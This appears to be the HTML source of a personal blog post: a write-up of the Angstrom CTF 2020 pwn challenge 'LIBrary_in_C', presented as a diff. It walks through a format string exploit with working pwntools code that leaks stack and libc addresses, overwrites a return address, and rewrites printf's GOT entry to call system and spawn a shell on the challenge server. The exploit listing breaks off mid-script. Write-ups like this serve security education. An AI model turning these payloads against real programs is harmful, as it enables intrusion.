@@ -1,0 +1,1297 @@
+<!DOCTYPE html><html lang="en">
+  <head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>Angstrom CTF 2020 - Jakub Acs's Personal Blog</title>
+
+<meta name="description" content="I recently took part in Angstrom CTF 2020, together with my team DISsect@CTU. As usual, I focused on the pwn category and I decided to share write-up of the ...">
+<link rel="canonical" href="http://0.0.0.0:4000/2020/03/21/AngstromCTF-2020.html"><link rel="alternate" type="application/rss+xml" title="Jakub Acs's Personal Blog" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">
+
+<meta name="msapplication-TileColor" content="#ffc40d"><meta name="msapplication-config" content="/assets/browserconfig.xml">
+
+<meta name="theme-color" content="#ffffff">
+<!-- end favicons snippet --><link rel="stylesheet" href="/assets/css/main.css"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" ><!-- start custom head snippets -->
+
+<!-- end custom head snippets -->
+<script>(function() {
+  window.isArray = function(val) {
+    return Object.prototype.toString.call(val) === '[object Array]';
+  };
+  window.isString = function(val) {
+    return typeof val === 'string';
+  };
+
+  window.hasEvent = function(event) {
+    return 'on'.concat(event) in window.document;
+  };
+
+  window.isOverallScroller = function(node) {
+    return node === document.documentElement || node === document.body || node === window;
+  };
+
+  window.isFormElement = function(node) {
+    var tagName = node.tagName;
+    return tagName === 'INPUT' || tagName === 'SELECT' || tagName === 'TEXTAREA';
+  };
+
+  window.pageLoad = (function () {
+    var loaded = false, cbs = [];
+    window.addEventListener('load', function () {
+      var i;
+      loaded = true;
+      if (cbs.length > 0) {
+        for (i = 0; i < cbs.length; i++) {
+          cbs[i]();
+        }
+      }
+    });
+    return {
+      then: function(cb) {
+        cb && (loaded ? cb() : (cbs.push(cb)));
+      }
+    };
+  })();
+})();
+(function() {
+  window.throttle = function(func, wait) {
+    var args, result, thisArg, timeoutId, lastCalled = 0;
+
+    function trailingCall() {
+      lastCalled = new Date;
+      timeoutId = null;
+      result = func.apply(thisArg, args);
+    }
+    return function() {
+      var now = new Date,
+        remaining = wait - (now - lastCalled);
+
+      args = arguments;
+      thisArg = this;
+
+      if (remaining <= 0) {
+        clearTimeout(timeoutId);
+        timeoutId = null;
+        lastCalled = now;
+        result = func.apply(thisArg, args);
+      } else if (!timeoutId) {
+        timeoutId = setTimeout(trailingCall, remaining);
+      }
+      return result;
+    };
+  };
+})();
+(function() {
+  var Set = (function() {
+    var add = function(item) {
+      var i, data = this._data;
+      for (i = 0; i < data.length; i++) {
+        if (data[i] === item) {
+          return;
+        }
+      }
+      this.size ++;
+      data.push(item);
+      return data;
+    };
+
+    var Set = function(data) {
+      this.size = 0;
+      this._data = [];
+      var i;
+      if (data.length > 0) {
+        for (i = 0; i < data.length; i++) {
+          add.call(this, data[i]);
+        }
+      }
+    };
+    Set.prototype.add = add;
+    Set.prototype.get = function(index) { return this._data[index]; };
+    Set.prototype.has = function(item) {
+      var i, data = this._data;
+      for (i = 0; i < data.length; i++) {
+        if (this.get(i) === item) {
+          return true;
+        }
+      }
+      return false;
+    };
+    Set.prototype.is = function(map) {
+      if (map._data.length !== this._data.length) { return false; }
+      var i, j, flag, tData = this._data, mData = map._data;
+      for (i = 0; i < tData.length; i++) {
+        for (flag = false, j = 0; j < mData.length; j++) {
+          if (tData[i] === mData[j]) {
+            flag = true;
+            break;
+          }
+        }
+        if (!flag) { return false; }
+      }
+      return true;
+    };
+    Set.prototype.values = function() {
+      return this._data;
+    };
+    return Set;
+  })();
+
+  window.Lazyload = (function(doc) {
+    var queue = {js: [], css: []}, sources = {js: {}, css: {}}, context = this;
+    var createNode = function(name, attrs) {
+      var node = doc.createElement(name), attr;
+      for (attr in attrs) {
+        if (attrs.hasOwnProperty(attr)) {
+          node.setAttribute(attr, attrs[attr]);
+        }
+      }
+      return node;
+    };
+    var end = function(type, url) {
+      var s, q, qi, cbs, i, j, cur, val, flag;
+      if (type === 'js' || type ==='css') {
+        s = sources[type], q = queue[type];
+        s[url] = true;
+        for (i = 0; i < q.length; i++) {
+          cur = q[i];
+          if (cur.urls.has(url)) {
+            qi = cur, val = qi.urls.values();
+            qi && (cbs = qi.callbacks);
+            for (flag = true, j = 0; j < val.length; j++) {
+              cur = val[j];
+              if (!s[cur]) {
+                flag = false;
+              }
+            }
+            if (flag && cbs && cbs.length > 0) {
+              for (j = 0; j < cbs.length; j++) {
+                cbs[j].call(context);
+              }
+              qi.load = true;
+            }
+          }
+        }
+      }
+    };
+    var load = function(type, urls, callback) {
+      var s, q, qi, node, i, cur,
+        _urls = typeof urls === 'string' ? new Set([urls]) : new Set(urls), val, url;
+      if (type === 'js' || type ==='css') {
+        s = sources[type], q = queue[type];
+        for (i = 0; i < q.length; i++) {
+          cur = q[i];
+          if (_urls.is(cur.urls)) {
+            qi = cur;
+            break;
+          }
+        }
+        val = _urls.values();
+        if (qi) {
+          callback && (qi.load || qi.callbacks.push(callback));
+          callback && (qi.load && callback());
+        } else {
+          q.push({
+            urls: _urls,
+            callbacks: callback ? [callback] : [],
+            load: false
+          });
+          for (i = 0; i < val.length; i++) {
+            node = null, url = val[i];
+            if (s[url] === undefined) {
+              (type === 'js' ) && (node = createNode('script', { src: url }));
+              (type === 'css') && (node = createNode('link', { rel: 'stylesheet', href: url }));
+              if (node) {
+                node.onload = (function(type, url) {
+                  return function() {
+                    end(type, url);
+                  };
+                })(type, url);
+                (doc.head || doc.body).appendChild(node);
+                s[url] = false;
+              }
+            }
+          }
+        }
+      }
+    };
+    return {
+      js: function(url, callback) {
+        load('js', url, callback);
+      },
+      css: function(url, callback) {
+        load('css', url, callback);
+      }
+    };
+  })(this.document);
+})();
+</script><script>
+  (function() {
+    var TEXT_VARIABLES = {
+      version: '2.2.6',
+      sources: {
+        font_awesome: 'https://use.fontawesome.com/releases/v5.0.13/css/all.css',
+        jquery: 'https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js',
+        leancloud_js_sdk: '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js',
+        chart: 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js',
+        gitalk: {
+          js: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.js',
+          css: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.css'
+        },
+        valine: 'https://unpkg.com/valine/dist/Valine.min.js',
+        mathjax: 'https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML',
+        mermaid: 'https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js'
+      },
+      site: {
+        toc: {
+          selectors: 'h1,h2,h3'
+        }
+      },
+      paths: {
+        search_js: '/assets/search.js'
+      }
+    };
+    window.TEXT_VARIABLES = TEXT_VARIABLES;
+  })();
+</script>
+</head>
+  <body>
+    <div class="root" data-is-touch="false">
+      <div class="layout--page js-page-root"><div class="page__main js-page-main page__viewport has-aside cell cell--auto">
+
+      <div class="page__main-inner"><div class="page__header d-print-none"><header class="header"><div class="main">
+      <div class="header__title">
+        <div class="header__brand">
+          <!-- logo not ready <img src="assets/images/logo/avatar.png" /> --><a title="" href="/">Jakub Acs's Personal Blog</a></div><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></div><nav class="navigation">
+        <ul><li class="navigation__item"><a href="/"></a></li><li><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></li></ul>
+      </nav></div>
+  </header>
+</div><div class="page__content"><div class ="main"><div class="grid grid--reverse">
+
+              <div class="col-aside d-print-none js-col-aside"><aside class="page__aside js-page-aside"><div class="toc-aside js-toc-root"></div>
+</aside></div>
+
+              <div class="col-main cell cell--auto"><!-- start custom main top snippet -->
+
+<!-- end custom main top snippet -->
+<article itemscope itemtype="http://schema.org/Article"><div class="article__header"><header><h1>Angstrom CTF 2020</h1></header><span class="split-space">&nbsp;</span>
+          <!-- 
+            commenting out button for github edit
+            <a class="edit-on-github"
+            title="Edit on Github"
+            href="https://github.com/user_name/repo_name/tree/master/_posts/2020-03-21-AngstromCTF-2020.md">
+            <i class="far fa-edit"></i></a> --></div><meta itemprop="headline" content="Angstrom CTF 2020"><div class="article__info clearfix"><ul class="left-col menu"><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/archive.html?tag=ctf">ctf</a>
+            </li><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/archive.html?tag=pwn">pwn</a>
+            </li><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/archive.html?tag=write-up">write-up</a>
+            </li></ul><ul class="right-col menu"><li><i class="far fa-calendar-alt"></i> <span>Mar 21, 2020</span>
+            </li></ul></div><meta itemprop="author" content="Jakub Acs"/><meta itemprop="datePublished" content="2020-03-21T00:00:00+00:00">
+    <meta itemprop="keywords" content="ctf,pwn,write-up"><div class="js-article-content"><div class="layout--article"><!-- start custom article top snippet -->
+
+<!-- end custom article top snippet -->
+<div class="article__content" itemprop="articleBody"><p>I recently took part in <a href="https://2020.angstromctf.com">Angstrom CTF 2020</a>, together with my team <a href="https://dissect.eu">DISsect@CTU</a>. As usual, I focused on the <code class="highlighter-rouge">pwn</code> category and I decided to share write-up of the most interesting challenge with you int this blog post. The challenges are still online and working, just like PicoCTF, so I encourage you to go ahead and try them.</p>
+
+<!--more-->
+
+<h1 id="library_in_c-write-up">LIBrary_in_C write-up</h1>
+
+<p><strong>ctf</strong>: Angstrom CTF 2020</p>
+
+<p><strong>category</strong>: pwn</p>
+
+<p><strong>points</strong>: 120</p>
+
+<h2 id="task">Task</h2>
+<p><img src="../../../assets/images/2020-03-21-task.png" alt="" /></p>
+
+<p>We are given a <code class="highlighter-rouge">binary</code>, <code class="highlighter-rouge">source</code> and used <code class="highlighter-rouge">libc.so.6</code>.</p>
+
+<h2 id="tldr">TLDR;</h2>
+
+<p>Format string vulnerability to leak <code class="highlighter-rouge">stack</code> and <code class="highlighter-rouge">libc</code> addresses. Overwrite return address to return to <code class="highlighter-rouge">main</code> for more input opportunities. Overwrite <code class="highlighter-rouge">printf</code> GOT with <code class="highlighter-rouge">system</code> and send <code class="highlighter-rouge">/bin/sh\x00</code> as next payload. (Not the easiest way)</p>
+
+<h2 id="vulnerability">Vulnerability</h2>
+
+<p>Since we are given source for the file, searching for vulnerability is fairly easy, we can see that we have two opportunities to use format string vulnerability in two vulnerable <code class="highlighter-rouge">printf</code> calls:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+	<span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+	<span class="n">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
+	<span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
+
+	<span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+	<span class="kt">char</span> <span class="n">book</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">"Welcome to the LIBrary in C!"</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">"What is your name?"</span><span class="p">);</span>
+	<span class="n">fgets</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+	<span class="c1">// printf works just like System.out.print in Java right?</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Why hello there "</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>                                            <span class="o">&lt;-</span> <span class="n">here</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">"And what book would you like to check out?"</span><span class="p">);</span>
+	<span class="n">fgets</span><span class="p">(</span><span class="n">book</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Your cart:</span><span class="se">\n</span><span class="s"> - "</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="n">book</span><span class="p">);</span>                                            <span class="o">&lt;-</span> <span class="n">here</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">That's great and all but uh..."</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">"It turns out this library doesn't actually exist so you'll never get your book."</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">"Have a nice day!"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Running <code class="highlighter-rouge">rabin2</code> reveals that binary is 64bit, compiled with canaries, but that is not a concern, since with format strings we can cherry pick the addresses we want to write to. Also, the binary does not use position independent code, which discloses the GOT addresses for us.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/CTFs/Angstrom2020/pwn/library_in_c# rabin2 <span class="nt">-I</span> library_in_c
+<span class="nb">arch     </span>x86
+baddr    0x400000
+binsz    6790
+bintype  elf
+bits     64
+canary   <span class="nb">true
+</span>class    ELF64
+compiler GCC: <span class="o">(</span>Ubuntu 7.4.0-1ubuntu1~18.04.1<span class="o">)</span> 7.4.0
+crypto   <span class="nb">false
+</span>endian   little
+havecode <span class="nb">true
+</span>intrp    /lib64/ld-linux-x86-64.so.2
+laddr    0x0
+lang     c
+linenum  <span class="nb">true
+</span>lsyms    <span class="nb">true
+</span>machine  AMD x86-64 architecture
+maxopsz  16
+minopsz  1
+nx       <span class="nb">true
+</span>os       linux
+pcalign  0
+pic      <span class="nb">false
+</span>relocs   <span class="nb">true
+</span>relro    partial
+rpath    NONE
+sanitiz  <span class="nb">false
+</span>static   <span class="nb">false
+</span>stripped <span class="nb">false
+</span>subsys   linux
+va       <span class="nb">true</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">printf</code> function determines the number of arguments by the format string argument (by the number of % sequences). It expects the following arguments to be stored on the stack even in the 64bit calling convention. Since our buffer used as the format string for this <code class="highlighter-rouge">printf</code> call is also stored on the stack, we can not only print the contents of the stack, but with <code class="highlighter-rouge">%n</code>, control the destination of our future writes.</p>
+
+<h2 id="exploit">Exploit</h2>
+
+<h3 id="argument-find">Argument find</h3>
+
+<p>In order to exploit this, we first need to find the order of argument, which we can use to refer to the start of our buffer. Since the executable is 64bit, it will take arguments as quad words from the stack. I wrote a simple script which uses <code class="highlighter-rouge">glibc</code>’s <code class="highlighter-rouge">i$</code> notation to refer to the <code class="highlighter-rouge">i</code>-th argument and print it as a hexadecimal quadword:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> 
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">256</span><span class="p">):</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./library_in_c'</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">f</span><span class="s">'AAAAAAAA </span><span class="si">%</span><span class="s">{i}$p'</span><span class="p">)</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">'{i} =&gt; {s}'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/CTFs/Angstrom2020/pwn/library_in_c# python3 discover.py | <span class="nb">grep</span> <span class="s1">'0x4141'</span>
+8 <span class="o">=&gt;</span> b<span class="s1">'Welcome to the LIBrary in C!\nWhat is your name?\nWhy hello there AAAAAAAA 0x4141414141414141\nAnd what book would you like to check out?\n'</span>
+</code></pre></div></div>
+<p>Then I slightly modified it for the second <code class="highlighter-rouge">printf</code> call.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/CTFs/Angstrom2020/pwn/library_in_c# python3 discover.py | <span class="nb">grep</span> <span class="s1">'0x4141'</span>
+16 <span class="o">=&gt;</span> b<span class="s2">"Your cart:</span><span class="se">\n</span><span class="s2"> - AAAAAAAA 0x4141414141414141</span><span class="se">\n\n</span><span class="s2">That's great and all but uh...</span><span class="se">\n</span><span class="s2">It turns out this library doesn't actually exist so you'll never get your book.</span><span class="se">\n</span><span class="s2">Have a nice day!</span><span class="se">\n</span><span class="s2">"</span>
+
+</code></pre></div></div>
+
+<p>So now I know, that first quadword(8 bytes) of my buffer is stored as 8th(16th) argument for the first (second) <code class="highlighter-rouge">printf</code> call. Next 8 bytes are the 9th(17th) argument. We will use this when overwriting.</p>
+
+<h3 id="stack-and-libc-leak">stack and libc leak</h3>
+
+<p>In this part I will explain how I leaked the <code class="highlighter-rouge">libc</code> and <code class="highlighter-rouge">stack</code> addreses.</p>
+
+<p>Our vulnerable <code class="highlighter-rouge">printf</code> calls are in <code class="highlighter-rouge">main</code> function. Main is initiated from <code class="highlighter-rouge">__libc_start_main</code> function, which is a part of <code class="highlighter-rouge">libc</code>. We will use the fact that the return adress for <code class="highlighter-rouge">main</code>, stored further on the stack, is address to <code class="highlighter-rouge">__libc_start_main</code>. This address is stored as 
+27th argument for our <code class="highlighter-rouge">printf</code> call. I also wanted to leak some reliable <code class="highlighter-rouge">stack</code> address. After some debugging, I chose the address corresponding to 24th argument.</p>
+
+<p>Thus my first payload that leaks addresses looks as follows:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload_leak</span> <span class="o">=</span> <span class="s">'</span><span class="si">%24</span><span class="s">$p </span><span class="si">%27</span><span class="s">$p'</span>
+</code></pre></div></div>
+
+<p>This payload gets us two addresses that we need to further process to get the ones that we desire. To get the address of system in current process memory, we do the following.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">libc_address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0xf0</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__libc_start_main'</span><span class="p">]</span>
+<span class="n">libc_system</span> <span class="o">=</span> <span class="n">libc_address</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+</code></pre></div></div>
+
+<p>0xf0 is the offset in <code class="highlighter-rouge">__libc_start_main</code>. <code class="highlighter-rouge">libc_leak</code> is the address stored as return address for <code class="highlighter-rouge">main</code></p>
+
+<h3 id="ret2main">ret2main</h3>
+
+<p>At the time I was exploiting this challenge, I didn’t realise I can use one gadget and jmp straight to <code class="highlighter-rouge">libc</code> to <code class="highlighter-rouge">execve('/bin/sh')</code>. Thus, I wanted to return to main to give myself another round of format string inputs. To do this, I computed the address where the <code class="highlighter-rouge">main</code>’s return address is stored and with second <code class="highlighter-rouge">printf</code> call, I wrote <code class="highlighter-rouge">main</code>’s address. This way, after finishing <code class="highlighter-rouge">main</code>, we jump back to <code class="highlighter-rouge">main</code> again.</p>
+
+<p>Obtaining the pointer to return address(at stack) for <code class="highlighter-rouge">main</code>, storing it as <code class="highlighter-rouge">ret_addr</code> was done using stack address leaked in previous step and subtracting constant from it (I don’t know where was the leaked address meant to be pointing, but it was a constant offset from <code class="highlighter-rouge">ret_addr</code>, so I used it)</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload_ret2main</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="si">%20</span><span class="s">$n</span><span class="si">%64</span><span class="s">s</span><span class="si">%21</span><span class="s">$hn</span><span class="si">%1799</span><span class="s">s</span><span class="si">%22</span><span class="s">$hn     '</span>
+<span class="n">payload_ret2main</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret_addr</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span>
+<span class="n">payload_ret2main</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret_addr</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span>
+<span class="n">payload_ret2main</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Let’s have a look at the payload closer:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+writes 0x00000000 to ret_addr + 4
+  |
+  |  writes 0x0040 to ret_addr + 2
+  |     |
+  |     |         writes 0x0747 to ret_addr
+  |     |           |
+__|__ __|_____ _____|______  ___ &lt;----- rest is padding
+%20$n%64s%21$hn%1799s%22$hn     '
+
+</code></pre></div></div>
+<p>This causes ret_addr now contains <code class="highlighter-rouge">0x0000000000400747</code>, which is the address of <code class="highlighter-rouge">main</code>.</p>
+
+<h3 id="got-overwrite">GOT overwrite</h3>
+
+<p>In previous section I had to write known address to unknown place. This time it’s going to be the other way around. We will be writing the leaked <code class="highlighter-rouge">libc_system</code> address to known <code class="highlighter-rouge">GOT</code> entry of <code class="highlighter-rouge">printf</code>. I decided to only overwrite the lower 3 bytes, since the higher bytes had to remain the same from <code class="highlighter-rouge">printf</code>. I first wrote the higher byte and then the remaining two as a word.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">what</span><span class="p">,</span> <span class="n">where</span><span class="p">):</span>
+    <span class="n">what</span> <span class="o">=</span> <span class="n">what</span> <span class="o">&amp;</span> <span class="mh">0xffffff</span>
+    <span class="n">hi_byte</span> <span class="o">=</span> <span class="n">what</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span>
+    <span class="n">low_word</span> <span class="o">=</span> <span class="n">what</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
+
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s">'printing {hi_byte} to {where +2} and {low_word} to {where}'</span><span class="p">)</span>
+
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="si">%12</span><span class="s">$'</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="n">hi_byte</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'s</span><span class="si">%12</span><span class="s">$hhn'</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="si">%12</span><span class="s">$'</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="n">low_word</span> <span class="o">-</span><span class="n">hi_byte</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'s</span><span class="si">%13</span><span class="s">$hn'</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="p">(</span><span class="mi">32</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span><span class="o">*</span><span class="n">b</span><span class="s">' '</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">where</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">where</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">payload</span>
+</code></pre></div></div>
+<p>After sending this payload to the first <code class="highlighter-rouge">printf</code> call, each of the following <code class="highlighter-rouge">printf</code> calls will actually call <code class="highlighter-rouge">system</code> instead of printf. We overwrote it’s <code class="highlighter-rouge">GOT</code> entry.</p>
+
+<h3 id="putting-it-all-together">Putting it all together</h3>
+
+<p>How the final exploit is executed:</p>
+<ol>
+  <li>leak the addreses for future payloads</li>
+  <li>overwrite the return address to return to main</li>
+  <li>after returning to main, use additional <code class="highlighter-rouge">printf</code> call to overwrite <code class="highlighter-rouge">GOT</code>.</li>
+  <li>the next <code class="highlighter-rouge">printf</code> call will actually be a <code class="highlighter-rouge">system</code> call. But wait, the next ‘<code class="highlighter-rouge">printf</code> is again called with our input as it’s only argument, so we can simply send <code class="highlighter-rouge">/bin/sh\x00</code> and <code class="highlighter-rouge">system('/bin/sh')</code> gets executed.</li>
+</ol>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/CTFs/Angstrom2020/pwn/library_in_c# python3 xplt.py 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/root/CTFs/Angstrom2020/pwn/library_in_c/library_in_c'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/root/CTFs/Angstrom2020/pwn/library_in_c/libc.so.6'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+<span class="o">[</span>+] Opening connection to shell.actf.co on port 20201: Done
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="k">return </span>address stored at 0x7ffea5436a18
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> libc at 0x7f80bb20b000
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> payload to ret2main b<span class="s1">'%20$n%64s%21$hn%1799s%22$hn     \x1cjC\xa5\xfe\x7f\x00\x00\x1ajC\xa5\xfe\x7f\x00\x00\x18jC\xa5\xfe\x7f\x00\x00'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> returning to main
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> printing 37 to 6295602 and 912 to 6295600
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> sending overwrite payload b<span class="s1">'%12$37s%12$hhn%12$875s%13$hn    2\x10`\x00\x00\x00\x00\x000\x10`\x00\x00\x00\x00\x00'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
+                                                                                               %<span class="se">\x</span>bb<span class="se">\x</span>80<span class="se">\x</span>7f    2<span class="se">\x</span>10And what book would you like to check out?
+sh: 1: Your: not found
+sh: 2: -: not found
+<span class="nv">$ </span><span class="nb">ls
+</span>flag.txt
+library_in_c
+library_in_c.c
+<span class="nv">$ </span><span class="nb">cat </span>flag.txt
+actf<span class="o">{</span>us1ng_c_15_n3v3r_4_g00d_1d34<span class="o">}</span>
+</code></pre></div></div>
+
+<h2 id="exploit-listing">Exploit listing</h2>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from pwn import *
+
+def write(what, where):
+    what = what &amp; 0xffffff
+    hi_byte = what &gt;&gt; 16
+    low_word = what &amp; 0xffff
+
+    log.info(f'printing {hi_byte} to {where +2} and {low_word} to {where}')
+
+    payload = b'%12$'
+    payload += str(hi_byte).encode()
+    payload += b's%12$hhn'
+    payload += b'%12$'
+    payload += str(low_word -hi_byte).encode()
+    payload += b's%13$hn'
+    payload += (32-len(payload))*b' '
+    payload += p64(where+2)
+    payload += p64(where)
+    return payload
+
+def check_payload(payload):
+    if b'\n' in payload:
+        log.error('error, payload contains newline')
+
+context.log_level = "info"
+
+elf = ELF('./library_in_c')
+libc = ELF('./libc.so.6')
+#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+main = elf.symbols['main']
+
+#r = process('./library_in_c')
+r = remote('shell.actf.co', 20201)
+#r = remote('localhost', 8080)
+
+payload_leak = '%24$p %27$p'
+
+r.sendline(payload_leak)
+s = r.recvline()
+s = r.recvline()
+s = r.recvline()
+
+stack_leak = int(s.split(b' ')[-2], 16)
+ret_addr = stack_leak -216
+libc_leak = int(s.split(b' ')[-1], 16)
+libc_address = libc_leak - 0xf0 - libc.symbols['__libc_start_main']
+libc_system = libc_address + libc.symbols['system']
+
+
+log.info(f'return address stored at {hex(ret_addr)}')
+log.info(f'libc at {hex(libc_address)}')
+
+payload_ret2main = b'%20$n%64s%21$hn%1799s%22$hn     '
+payload_ret2main += p64(ret_addr + 4)
+payload_ret2main += p64(ret_addr + 2)
+payload_ret2main += p64(ret_addr)
+
+log.info(f'payload to ret2main {payload_ret2main}')
+log.info('returning to main')
+
+r.sendline(payload_ret2main)
+
+
+s = r.recv()
+
